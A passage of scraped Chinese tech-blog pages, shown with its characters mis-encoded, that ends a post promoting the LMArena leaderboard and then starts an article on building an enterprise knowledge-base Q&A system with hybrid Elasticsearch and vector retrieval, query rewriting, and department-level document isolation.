<p><strong>Leaderboard</strong> é¡µé¢è¶…çº§æ¸…æ™°ï¼Œæ–‡æœ¬ã€è§†è§‰ã€ç¡¬æ ¸æ¨ç†ç­‰å¤šç»´åº¦æ’è¡Œä¸€ç›®äº†ç„¶ã€‚ç›®å‰æ¦œé¦–è¿˜æ˜¯é‚£äº›ç†Ÿæ‚‰çš„åå­—ï¼Œä½†æ–°æ¨¡å‹éšæ—¶å¯èƒ½é€†è¢­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b06f2a646d324e859bf381c408447256~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=ltFXJFSTzmnfHjKifgXriBglgbE%3D" alt="image.png" loading="lazy"/></p>
<p>æ€»ä¹‹ï¼Œç”¨ä¸‹æ¥åªæƒ³è¯´ï¼š**è¿™æ‰æ˜¯æœ€å…¬å¹³ã€æœ€å¥½ç©çš„AI è¯„æµ‹æ–¹å¼ï¼**æ¯å¤©åˆ·ä¸€åˆ·ï¼ŒåŸºæœ¬å°±èƒ½çŸ¥é“å“ªä¸ªæ¨¡å‹æœ€å¼ºã€‚</p>
<h4 data-id="heading-4">å†™åœ¨æœ€åï¼šAIè¯„æµ‹çš„æœªæ¥ï¼Œå·²ç»æ¥äº†</h4>
<p><strong>LMArena</strong> çš„çˆ†ç«ï¼Œè¯´æ˜ä¸€ä¸ªé“ç†ï¼š<strong>AI æ—¶ä»£ï¼Œå…‰æœ‰æ¨¡å‹ä¸å¤Ÿï¼Œè¿˜å¾—æœ‰é è°±çš„â€œè£åˆ¤â€</strong>ã€‚</p>
<p>å®ƒä¸ä»…å¸®æˆ‘ä»¬æ™®é€šç”¨æˆ·é€‰åˆ°æœ€å¥½ç”¨çš„ AIï¼Œè¿˜åœ¨æ¨åŠ¨æ•´ä¸ªè¡Œä¸šå‘æ›´é€æ˜ã€æ›´è´Ÿè´£çš„æ–¹å‘å‘å±•ã€‚</p>
<p>èèµ„æˆåŠŸåï¼Œ<strong>LMArena</strong> ä¼šå˜å¾—æ›´å¼ºâ€”â€”æ›´å¤šæ¨¡æ€ã€æ›´å¤šåŠŸèƒ½ã€æ›´å¥½ä½“éªŒã€‚</p>
<p>ä½ è¿˜åœ¨ç­‰ä»€ä¹ˆï¼Ÿ</p>
<p>èµ¶ç´§å» <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Flmarena.ai%2F" target="_blank" title="https://lmarena.ai/" ref="nofollow noopener noreferrer">lmarena.ai/</a></strong> å¼€æŠ•ï¼å¤šæŠ•å‡ ç¥¨ï¼Œä½ å°±æ˜¯ AI è¿›æ­¥çš„æ¨åŠ¨è€…ï½</p>
<h2 data-id="heading-5">æœ€å</h2>
<p>å…³æ³¨å…¬ä¼—å·ã€AIä¿¡æ¯é£å‘ã€‘ï¼Œå›å¤ 666ï¼Œå³å¯è·å–æ›´å¤š AI è¡Œä¸šæŠ¥å‘Šå’Œ AI å‰æ²¿å·¥å…·ã€‚</p>
<p>AI æŠ€æœ¯æ­£ä»¥å‰æ‰€æœªæœ‰çš„é€Ÿåº¦å‘å±•ï¼Œå®ƒå°†å¦‚ä½•å¡‘é€ æˆ‘ä»¬çš„æœªæ¥ï¼Ÿè®©æˆ‘ä»¬æ‹­ç›®ä»¥å¾…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»éœ€æ±‚åˆ°è½åœ°ï¼šæˆ‘ä»¬æ˜¯å¦‚ä½•æ­å»ºä¼ä¸šçŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿçš„]]></title>    <link>https://juejin.cn/post/7592508079305736211</link>    <guid>https://juejin.cn/post/7592508079305736211</guid>    <pubDate>2026-01-08T02:44:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592508079305736211" data-draft-id="7592483877987368966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»éœ€æ±‚åˆ°è½åœ°ï¼šæˆ‘ä»¬æ˜¯å¦‚ä½•æ­å»ºä¼ä¸šçŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿçš„"/> <meta itemprop="keywords" content="åç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T02:44:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»éœ€æ±‚åˆ°è½åœ°ï¼šæˆ‘ä»¬æ˜¯å¦‚ä½•æ­å»ºä¼ä¸šçŸ¥è¯†åº“é—®ç­”ç³»ç»Ÿçš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:44:37.000Z" title="Thu Jan 08 2026 02:44:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€éœ€æ±‚ä»å“ªæ¥ï¼Ÿ</h2>
<p>å»å¹´ä¸‹åŠå¹´ï¼Œå…¬å¸HRéƒ¨é—¨æ‰¾åˆ°æˆ‘ä»¬ï¼Œè¯´å‘˜å·¥æ¯å¤©éƒ½åœ¨é—®é‡å¤çš„é—®é¢˜ï¼š</p>
<ul>
<li>"å…¥èŒéœ€è¦å‡†å¤‡ä»€ä¹ˆææ–™ï¼Ÿ"</li>
<li>"å‡ºå·®ä½å®¿èƒ½æŠ¥å¤šå°‘é’±ï¼Ÿ"</li>
<li>"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</li>
</ul>
<p>HRåŒäº‹æ¯å¤©è¦å›ç­”å‡ åéåŒæ ·çš„é—®é¢˜ï¼Œå®åœ¨å—ä¸äº†äº†ã€‚ä»–ä»¬å¸Œæœ›èƒ½æœ‰ä¸ªç³»ç»Ÿï¼Œå‘˜å·¥è‡ªå·±é—®ï¼Œç³»ç»Ÿè‡ªå·±ç­”ã€‚</p>
<p>å¬èµ·æ¥å¾ˆç®€å•å¯¹å§ï¼Ÿä¸å°±æ˜¯åšä¸ªFAQå—ï¼Ÿä½†å½“æˆ‘ä»¬æ·±å…¥èŠä¸‹å»ï¼Œå‘ç°äº‹æƒ…æ²¡é‚£ä¹ˆç®€å•ã€‚</p>
<p>è´¢åŠ¡éƒ¨ä¹Ÿæœ‰ç±»ä¼¼éœ€æ±‚ï¼Œä½†ä»–ä»¬çš„æ–‡æ¡£å‘˜å·¥ä¸èƒ½éšä¾¿çœ‹ã€‚ITéƒ¨ä¹Ÿæƒ³æŠŠä»–ä»¬çš„æ“ä½œæ‰‹å†Œæ¥è¿›æ¥ï¼Œä½†ä¹Ÿä¸æƒ³è®©å…¶ä»–éƒ¨é—¨çœ‹åˆ°å†…éƒ¨ç³»ç»Ÿé…ç½®ã€‚</p>
<p><strong>æ ¸å¿ƒéœ€æ±‚å…¶å®æ˜¯ï¼š</strong></p>
<ul>
<li>å‘˜å·¥èƒ½ç”¨è‡ªç„¶è¯­è¨€æé—®</li>
<li>ç³»ç»Ÿèƒ½ç†è§£å¹¶ç»™å‡ºå‡†ç¡®ç­”æ¡ˆ</li>
<li>ä¸åŒéƒ¨é—¨çš„æ–‡æ¡£è¦ä¸¥æ ¼éš”ç¦»</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[å‘˜å·¥æé—®] --&gt;|è‡ªç„¶è¯­è¨€| B[çŸ¥è¯†åº“ç³»ç»Ÿ]
    B --&gt; C{æƒé™æ£€æŸ¥}
    C --&gt;|HRéƒ¨é—¨| D[HRæ–‡æ¡£]
    C --&gt;|è´¢åŠ¡éƒ¨é—¨| E[è´¢åŠ¡æ–‡æ¡£]
    C --&gt;|ITéƒ¨é—¨| F[ITæ–‡æ¡£]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1e1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#e1ffe1
</code></pre>
<h2 data-id="heading-1">äºŒã€ç¬¬ä¸€ä¸ªæ€è€ƒï¼šæ£€ç´¢æ–¹å¼æ€ä¹ˆé€‰ï¼Ÿ</h2>
<p>å½“æ—¶æˆ‘ä»¬è°ƒç ”äº†ä¸¤ç§ä¸»æµæ–¹æ¡ˆï¼š</p>
<h3 data-id="heading-2">æ–¹æ¡ˆAï¼šå…³é”®è¯æ£€ç´¢ï¼ˆElasticsearchï¼‰</h3>
<p>å°±æ˜¯ä¼ ç»Ÿçš„å…¨æ–‡æ£€ç´¢ï¼Œç”¨æˆ·è¾“å…¥"å‡ºå·®ä½å®¿"ï¼Œç³»ç»Ÿæ‰¾åŒ…å«è¿™äº›è¯çš„æ–‡æ¡£ã€‚</p>
<p><strong>ä¼˜ç‚¹å¾ˆæ˜æ˜¾ï¼š</strong></p>
<ul>
<li>å¯æ§æ€§å¼ºï¼Œç»“æœå¯é¢„æµ‹</li>
<li>èƒ½ç²¾ç¡®åŒ¹é…æœ¯è¯­</li>
<li>å‡ºé—®é¢˜å®¹æ˜“è°ƒè¯•</li>
</ul>
<p><strong>ä½†é—®é¢˜ä¹Ÿå¾ˆæ˜æ˜¾ï¼š</strong></p>
<p>å‘˜å·¥å®é™…é—®çš„æ˜¯ï¼š"å»ä¸Šæµ·å‡ºå·®ï¼Œé…’åº—èƒ½æŠ¥å¤šå°‘é’±ï¼Ÿ"</p>
<p>ä½ çš„æ–‡æ¡£å†™çš„æ˜¯ï¼š"ä¸€çº¿åŸå¸‚å·®æ—…ä½å®¿æ ‡å‡†ä¸º500å…ƒ/å¤©"</p>
<p>å…³é”®è¯æ£€ç´¢å¯èƒ½å°±æ‰¾ä¸åˆ°äº†ï¼Œå› ä¸ºå®ƒçœ‹ä¸æ‡‚"ä¸Šæµ·"="ä¸€çº¿åŸå¸‚"ï¼Œ"é…’åº—"="ä½å®¿"ã€‚</p>
<h3 data-id="heading-3">æ–¹æ¡ˆBï¼šå‘é‡æ£€ç´¢ï¼ˆEmbeddingï¼‰</h3>
<p>æŠŠæ–‡æ¡£å’Œé—®é¢˜éƒ½è½¬æˆå‘é‡ï¼Œç„¶åç®—ç›¸ä¼¼åº¦ã€‚ç†è®ºä¸Šèƒ½ç†è§£è¯­ä¹‰ã€‚</p>
<p><strong>å¬èµ·æ¥å¾ˆç¾å¥½ï¼š</strong></p>
<ul>
<li>ä¸ç”¨ç»´æŠ¤åŒä¹‰è¯åº“</li>
<li>èƒ½ç†è§£è‡ªç„¶è¯­è¨€</li>
<li>å¯¹æé—®æ–¹å¼ä¸æ•æ„Ÿ</li>
</ul>
<p><strong>ä½†æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™å‘ç°äº†ä¸ªå¤§é—®é¢˜ã€‚</strong></p>
<h2 data-id="heading-4">ä¸‰ã€å…³é”®è½¬æŠ˜ç‚¹ï¼šHR-Linkçš„å›°å¢ƒ</h2>
<p>æˆ‘ä»¬æœ‰ä¸ªå†…éƒ¨ç³»ç»Ÿå«"HR-Link"ï¼Œæ˜¯å…¬å¸è‡ªç ”çš„äººäº‹ç³»ç»Ÿã€‚</p>
<p>æµ‹è¯•ä¸­å‘ç°ä¸¤ä¸ªå…¸å‹åœºæ™¯ï¼š</p>
<p><strong>åœºæ™¯1ï¼šæ–°å‘˜å·¥ç›´æ¥é—®ç³»ç»Ÿåç§°</strong></p>
<p>å‘˜å·¥é—®ï¼š"HR-Linkçš„ç™»å½•åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ"</p>
<ul>
<li>Elasticsearchï¼šâœ… èƒ½æ‰¾åˆ°ï¼Œç²¾ç¡®åŒ¹é…"HR-Link"è¿™ä¸ªè¯</li>
<li>å‘é‡æ£€ç´¢ï¼šâŒ æ‰¾ä¸åˆ°ï¼Œå› ä¸ºembeddingæ¨¡å‹æ²¡è§è¿‡è¿™ä¸ªä¸“æœ‰åè¯</li>
</ul>
<p><strong>åœºæ™¯2ï¼šå‘˜å·¥ç”¨è‡ªç„¶è¯­è¨€é—®åŠŸèƒ½</strong></p>
<p>å‘˜å·¥é—®ï¼š"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</p>
<p>æ–‡æ¡£å†™çš„æ˜¯ï¼š"æ— æ³•ç™»å½•æ—¶ï¼Œè¯·åœ¨HR-Linkä¸­ç‚¹å‡»'å¿˜è®°å¯†ç 'é‡ç½®å‡­è¯"</p>
<ul>
<li>Elasticsearchï¼šâŒ æ‰¾ä¸åˆ°ï¼Œå› ä¸ºå‘˜å·¥æ²¡æ"HR-Link"è¿™ä¸ªè¯</li>
<li>å‘é‡æ£€ç´¢ï¼šâœ… èƒ½æ‰¾åˆ°ï¼Œç†è§£"å¿˜è®°å¯†ç "å’Œ"æ— æ³•ç™»å½•"æ˜¯åŒä¸€ä»¶äº‹</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9625dbac2d684844a1d7a32796d0a78d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LiP5rWq5peg55eV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445077&amp;x-signature=ognh93pHwxdFoCjo6ThA1%2FhBDyw%3D" alt="3.jpg" loading="lazy"/></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬æ„è¯†åˆ°ï¼š<strong>ä¸¤ç§æ–¹æ³•å„æœ‰ç›²åŒºã€‚</strong></p>
<p><strong>å…³é”®è¯æ£€ç´¢çš„ç›²åŒºï¼š</strong></p>
<ul>
<li>ç†è§£ä¸äº†åŒä¹‰æ›¿æ¢</li>
<li>å¤„ç†ä¸äº†å£è¯­åŒ–è¡¨è¾¾</li>
<li>éœ€è¦äººå·¥ç»´æŠ¤è¯å…¸</li>
</ul>
<p><strong>å‘é‡æ£€ç´¢çš„ç›²åŒºï¼š</strong></p>
<ul>
<li>ä¸è®¤è¯†å…¬å¸å†…éƒ¨æœ¯è¯­ï¼ˆHR-Linkã€F-Flowã€IT-SOP-005...ï¼‰</li>
<li>å¯¹ä¸“æœ‰åè¯ã€é¡¹ç›®ä»£å·æ— èƒ½ä¸ºåŠ›</li>
</ul>
<p>é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<h2 data-id="heading-5">å››ã€æˆ‘ä»¬çš„æ–¹æ¡ˆï¼šæ··åˆæ£€ç´¢</h2>
<p>æ—¢ç„¶å•ç‹¬ç”¨éƒ½æœ‰é—®é¢˜ï¼Œé‚£å°±ä¸¤ä¸ªä¸€èµ·ç”¨ã€‚</p>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong></p>
<ol>
<li>Elasticsearchæ‰¾10æ¡ï¼ˆä¿è¯å†…éƒ¨æœ¯è¯­èƒ½å‘½ä¸­ï¼‰</li>
<li>å‘é‡æ£€ç´¢æ‰¾10æ¡ï¼ˆä¿è¯è¯­ä¹‰ç›¸å…³çš„èƒ½æ‰¾åˆ°ï¼‰</li>
<li>åˆå¹¶å»é‡ï¼ŒæŒ‰æ–‡æ¡£å…ƒæ•°æ®æ’åº</li>
<li>æŠŠæœ€ç»ˆç»“æœäº¤ç»™LLMç”Ÿæˆç­”æ¡ˆ</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ç”¨æˆ·é—®é¢˜] --&gt; B[ESæ£€ç´¢]
    A --&gt; C[å‘é‡æ£€ç´¢]
    B --&gt; D[10æ¡ç»“æœ]
    C --&gt; E[10æ¡ç»“æœ]
    D --&gt; F[åˆå¹¶å»é‡]
    E --&gt; F
    F --&gt; G[æ’åºç­›é€‰]
    G --&gt; H[LLMç”Ÿæˆç­”æ¡ˆ]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#fff4e1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#ffe1f5
    style G fill:#ffe1f5
    style H fill:#e1f5ff
</code></pre>
<p>ä¸¾ä¸ªå®é™…ä¾‹å­ï¼š</p>
<p><strong>åœºæ™¯1ï¼šå†…éƒ¨ç³»ç»Ÿåç§°</strong></p>
<p>å‘˜å·¥é—®ï¼š"HR-Linkçš„ç™»å½•åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ"</p>
<ul>
<li>ESæœ"HR-Link" â†’ æ‰¾åˆ°æ–‡æ¡£ï¼ˆç²¾ç¡®åŒ¹é…ä¸“æœ‰åè¯ï¼‰âœ“</li>
<li>å‘é‡æœç´¢ â†’ æ‰¾ä¸åˆ°ï¼ˆæ¨¡å‹ä¸è®¤è¯†è¿™ä¸ªè¯ï¼‰âœ—</li>
</ul>
<p>æœ€ç»ˆèƒ½è¿”å›æ­£ç¡®ç­”æ¡ˆï¼Œå› ä¸ºESæ‰¾åˆ°äº†ã€‚</p>
<p><strong>åœºæ™¯2ï¼šåŠŸèƒ½æ€§æé—®</strong></p>
<p>å‘˜å·¥é—®ï¼š"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ"</p>
<p>æ–‡æ¡£å†™çš„æ˜¯ï¼š"æ— æ³•ç™»å½•æ—¶ï¼Œè¯·åœ¨HR-Linkä¸­ç‚¹å‡»'å¿˜è®°å¯†ç 'é‡ç½®å‡­è¯"</p>
<ul>
<li>ESæœ"å¿˜è®°å¯†ç " â†’ å¯èƒ½æ‰¾ä¸åˆ°ï¼ˆå‘˜å·¥æ²¡æ"HR-Link"ï¼Œæ’åé åï¼‰âœ—</li>
<li>å‘é‡æœç´¢ â†’ ç†è§£"å¿˜è®°å¯†ç "å’Œ"æ— æ³•ç™»å½•"çš„è¯­ä¹‰å…³è” âœ“</li>
</ul>
<p>æœ€ç»ˆä¹Ÿèƒ½è¿”å›æ­£ç¡®ç­”æ¡ˆï¼Œå› ä¸ºå‘é‡æ‰¾åˆ°äº†ã€‚</p>
<p><strong>åœºæ™¯3ï¼šå£è¯­åŒ–è¡¨è¾¾</strong></p>
<p>å‘˜å·¥é—®ï¼š"æˆ‘ç™»ä¸ä¸Šä»£ç å¹³å°äº†"</p>
<p>æ–‡æ¡£å†™çš„æ˜¯ï¼š"æ— æ³•è®¿é—®GitLabæ—¶ï¼Œè¯·æ£€æŸ¥VPNè¿æ¥"</p>
<ul>
<li>ESæœ"ç™»ä¸ä¸Šä»£ç å¹³å°" â†’ æ‰¾ä¸åˆ°ï¼ˆå­—é¢ä¸åŒ¹é…ï¼‰âœ—</li>
<li>å‘é‡æœç´¢ â†’ ç†è§£"ç™»ä¸ä¸Š"â‰ˆ"æ— æ³•è®¿é—®"ï¼Œ"ä»£ç å¹³å°"â‰ˆ"GitLab"âœ“</li>
</ul>
<p>æœ€ç»ˆä¹Ÿèƒ½è¿”å›æ­£ç¡®ç­”æ¡ˆã€‚</p>
<p><strong>è¿™å°±æ˜¯äº’è¡¥ã€‚</strong></p>
<h2 data-id="heading-6">äº”ã€ç¬¬äºŒä¸ªéš¾é¢˜ï¼šå¤šè½®å¯¹è¯</h2>
<p>æ–¹æ¡ˆè·‘èµ·æ¥åï¼Œæˆ‘ä»¬åˆå‘ç°äº†æ–°é—®é¢˜ã€‚</p>
<p>å‘˜å·¥ç¬¬ä¸€æ¬¡é—®ï¼š"ä¸€çº¿åŸå¸‚å‡ºå·®ä½å®¿æ ‡å‡†æ˜¯å¤šå°‘ï¼Ÿ"</p>
<p>ç³»ç»Ÿç­”ï¼š"500å…ƒ/å¤©"</p>
<p>ç´§æ¥ç€å‘˜å·¥é—®ï¼š"äºŒçº¿åŸå¸‚å‘¢ï¼Ÿ"</p>
<p>ç³»ç»Ÿæ‡µäº†ã€‚</p>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º"äºŒçº¿åŸå¸‚å‘¢ï¼Ÿ"è¿™ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>æ²¡æœ‰ä¸»è¯­</li>
<li>æ²¡æœ‰åŠ¨è¯</li>
<li>æ²¡æœ‰å®Œæ•´è¯­å¢ƒ</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[é—®é¢˜1: ä¸€çº¿åŸå¸‚ä½å®¿æ ‡å‡†?] --&gt; B[ç³»ç»Ÿ: 500å…ƒ/å¤©]
    B --&gt; C[é—®é¢˜2: äºŒçº¿åŸå¸‚å‘¢?]
    C --&gt; D{é—®é¢˜}
    D --&gt; E[ESæœäºŒçº¿åŸå¸‚&lt;br/&gt;å¯èƒ½æ‰¾åˆ°æ— å…³å†…å®¹]
    D --&gt; F[å‘é‡å¤ªçŸ­&lt;br/&gt;è¯­ä¹‰ä¸æ¸…æ™°]
    
    style A fill:#e1f5ff
    style B fill:#e1ffe1
    style C fill:#e1f5ff
    style D fill:#ffe1e1
    style E fill:#ffe1e1
    style F fill:#ffe1e1
</code></pre>
<p>å¦‚æœç›´æ¥å»æ£€ç´¢"äºŒçº¿åŸå¸‚"ï¼Œå¯èƒ½ä¼šæ‰¾åˆ°ï¼š</p>
<ul>
<li>"äºŒçº¿åŸå¸‚æ‹›è˜æ”¿ç­–"</li>
<li>"äºŒçº¿åŸå¸‚åŠå…¬å®¤åœ°å€"</li>
<li>å„ç§ä¸ç›¸å…³çš„å†…å®¹</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šQuery Rewritingï¼ˆæŸ¥è¯¢é‡å†™ï¼‰</strong></p>
<p>åœ¨æ£€ç´¢ä¹‹å‰ï¼Œå…ˆè®©LLMçœ‹ä¸€çœ¼å¯¹è¯å†å²ï¼ŒæŠŠé—®é¢˜è¡¥å…¨ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">å†å²ï¼š
<span class="hljs-symbol">Q1:</span> <span class="hljs-string">"ä¸€çº¿åŸå¸‚å‡ºå·®ä½å®¿æ ‡å‡†æ˜¯å¤šå°‘ï¼Ÿ"</span>
<span class="hljs-symbol">A1:</span> <span class="hljs-string">"500å…ƒ/å¤©"</span>

å½“å‰é—®é¢˜ï¼š<span class="hljs-string">"äºŒçº¿åŸå¸‚å‘¢ï¼Ÿ"</span>

é‡å†™åï¼š<span class="hljs-string">"äºŒçº¿åŸå¸‚å‡ºå·®ä½å®¿æ ‡å‡†æ˜¯å¤šå°‘ï¼Ÿ"</span>
</code></pre>
<p>é‡å†™åå†å»æ£€ç´¢ï¼Œå°±èƒ½å‡†ç¡®æ‰¾åˆ°æ–‡æ¡£äº†ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[äºŒçº¿åŸå¸‚å‘¢?] --&gt; B[LLMé‡å†™]
    B --&gt; C[äºŒçº¿åŸå¸‚å‡ºå·®&lt;br/&gt;ä½å®¿æ ‡å‡†?]
    C --&gt; D[æ··åˆæ£€ç´¢]
    D --&gt; E[æ‰¾åˆ°æ­£ç¡®æ–‡æ¡£]
    
    style A fill:#ffe1e1
    style B fill:#fff4e1
    style C fill:#e1ffe1
    style D fill:#fff4e1
    style E fill:#e1ffe1
</code></pre>
<h2 data-id="heading-7">å…­ã€æƒé™éš”ç¦»æ€ä¹ˆåšï¼Ÿ</h2>
<p>è¿™æ˜¯æ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨åŸºçº¿ã€‚</p>
